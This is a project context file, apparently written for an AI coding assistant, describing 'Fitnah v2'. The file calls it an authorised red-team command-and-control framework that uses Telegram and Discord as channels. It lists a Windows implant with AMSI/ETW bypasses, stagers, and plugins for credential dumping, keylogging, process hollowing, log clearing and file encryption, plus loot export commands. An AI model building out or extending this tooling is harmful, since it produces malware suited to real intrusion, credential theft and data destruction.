# Fitnah v2 — Claude Code context

## Project purpose
Authorised red-team C2 framework. Telegram bot is the sole primary C2 channel;
Discord is the fallback. The bot **only sends commands and receives data** — it
never builds anything. All payload generation happens on the operator workstation
via the builder pipeline.

## Stack
| Layer | Technology |
|---|---|
| CLI | Python / prompt_toolkit |
| C2 transport | python-telegram-bot 21+, discord.py 2.3+ |
| Persistence | SQLite (loot), JSONL (audit), YAML (config) |
| Crypto | `cryptography` (Python AES-GCM), BCrypt API (C implant) |
| Implant | C99, compiled with mingw-w64 cross-compiler |
| Shellcode | donut (optional, PE→shellcode) |

## Key design rules

- **Telegram bot = C2 bus only.** It sends `{"type":"TASK",...}` and receives
  `{"type":"ACK",...}` or `{"type":"CHECKIN",...}`. It never compiles or
  generates payloads.
- **Per-agent Telegram group.** Each implant gets its own private group.
  `Session.group_id` holds the group chat id.
- **Sync CLI ↔ async kernel.** `PluginContext.send()` and
  `FitnahConsole._run_async()` both use `asyncio.run_coroutine_threadsafe()`
  to cross the thread boundary.
- **Plugin discovery is automatic.** Drop a file in `fitnah/plugins/<category>/`,
  subclass `BasePlugin`, and the kernel loads it on start or `reload`.
- **ctx=None = offline mode.** Every plugin that needs a live session returns
  `ModuleResult.err("Requires live session")` when `ctx is None`. Plugins that
  generate artefacts (phish_link, macro_drop) work offline.

## Directory layout
```
fitnah/
  config.py                 — YAML loader, Config class
  orchestration/
    kernel.py               — top-level glue (Kernel)
    console.py              — FitnahConsole (prompt_toolkit REPL)
    session_manager.py      — Session + SessionManager
    audit_log.py            — append-only JSONL audit
    project.py              — Project (FuzzBunch-style workspace)
  c2/
    server.py               — C2Server (dispatch + ACK resolution)
    router.py               — Router (failover logic)
    telegram_ui.py          — TelegramUI (inline keyboard menus)
    transport/
      telegram.py           — TelegramTransport (priority 0)
      discord.py            — DiscordTransport  (priority 1)
  sdk/
    base_plugin.py          — BasePlugin ABC
    context.py              — PluginContext (sync→async bridge)
    result.py               — ModuleResult
    schema.py               — ParamSchema / Param
    testing.py              — MockSession
  loot/
    store.py                — LootStore (SQLite)
  builder/
    engine.py               — BuildEngine (orchestrates pipeline)
    models.py               — BuildRequest / BuildResult / enums
    compiler.py             — mingw-w64 cross-compile wrapper
    donut_wrap.py           — PE→shellcode via donut
    encryptor.py            — AES-256-GCM + XOR, C header emitter
    stagers/
      ps1.py                — PowerShell beacon-loop stager
      vba.py                — VBA macro wrapper
      hta.py                — HTA wrapper
  plugins/
    recon/          (8)     — sysinfo, screenshot, processes, network_info,
                              arp_scan, dns_enum, shares_enum, users_enum
    credential_access/ (6)  — dump_sam, lsass_dump, browser_creds,
                              wifi_creds, vault_creds, clipboard
    execution/      (4)     — shell_exec, powershell, dll_inject, process_hollow
    persistence/    (4)     — registry_run, scheduled_task, startup_folder,
                              wmi_subscribe
    lateral_movement/ (4)   — psexec, wmi_exec, smb_upload, rdp_enable
    defense_evasion/ (4)    — amsi_bypass, etw_patch, defender_exclude,
                              clear_logs
    collection/     (4)     — keylogger, file_search, email_harvest, dir_list
    exfiltration/   (3)     — upload_file, zip_exfil, chunked_send
    initial_access/ (2)     — phish_link, macro_drop
    impact/         (2)     — encrypt_files, wipe_logs
implant/
  fitnah_implant.c          — main entry, WinMain, beacon loop
  src/
    utils.c/.h              — base64, JSON helpers
    http.c/.h               — WinINet HTTPS to api.telegram.org
    crypto.c/.h             — BCrypt AES-256-GCM
    bypass.c/.h             — AMSI + ETW patches
    commands.c/.h           — command handlers
  Makefile
tests/                      — 177 tests across 9 test files
config/
  framework.yaml            — operator config (never commit tokens)
```

## Common commands during development

```bash
# run all tests
python -m pytest tests/ -q

# run specific phase
python -m pytest tests/test_phase4.py -v

# hot-reload plugins in the REPL
reload

# build a PS1 stager for the active session
builder -f ps1 -a <agent_id>

# search for a plugin
search lsass

# show loot and export
loot -q credential --export csv --out creds.csv
```

## Adding a new plugin
1. Create `fitnah/plugins/<category>/<name>.py`
2. Subclass `BasePlugin`, set `NAME`, `DESCRIPTION`, `MITRE`, `CATEGORY`
3. Implement `run(self, session, params, ctx=None) -> ModuleResult`
4. Use `ctx.exec()` / `ctx.ps()` / `ctx.send()` for live dispatch
5. Return `ModuleResult.err("Requires live session")` when `ctx is None`
6. Drop a test in `tests/` — the kernel auto-discovers the plugin

## Wire protocol summary
```
Operator → Agent  : {"type":"TASK","id":"<hex8>","command":"exec","args":{"cmd":"..."}}
Agent    → Operator: {"type":"ACK", "id":"<hex8>","status":"ok","output":"..."}
Agent    → Operator: {"type":"CHECKIN","agent_id":"...","hostname":"...","os":"...",...}
```
All messages are plaintext JSON sent as Telegram chat messages. The bot relays
them; it does not inspect or transform them.
